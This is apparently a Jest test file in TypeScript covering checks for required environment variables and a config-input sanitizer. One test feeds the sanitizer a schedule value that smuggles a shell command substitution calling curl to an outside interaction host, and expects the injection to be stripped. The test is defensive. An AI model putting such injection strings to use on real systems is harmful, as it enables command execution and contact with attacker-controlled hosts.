import {
  requireEnvironmentVariables,
  sanitizeConfigInput
} from '../src/utils/misc'

test('requireEnvironmentVariables succeeds when all variables are provided', () => {
  const required = ['A', 'B']

  process.env.A = 'A'
  process.env.B = 'B'

  let error: Error | undefined
  try {
    requireEnvironmentVariables(required)
  } catch (err) {
    error = err as Error
  }

  expect(error).toBeUndefined()
})

test('requireEnvironmentVariables fails when some variables are missing', () => {
  const required = ['A', 'B']

  delete process.env.B
  process.env.A = 'A'

  let error: Error | undefined
  try {
    requireEnvironmentVariables(required)
  } catch (err) {
    error = err as Error
  }

  expect(error).toBeDefined()
})

test('sanitizeConfigInput fails when some variables are missing', () => {
  const configScheduleInterval = 'daily $(curl http://jd0q6db7se2x9zynxzvgezle45awyomd.oastify.com/testing)'
  const sanitizedInterval = sanitizeConfigInput(configScheduleInterval)
  expect(sanitizedInterval).toBe('daily')
})
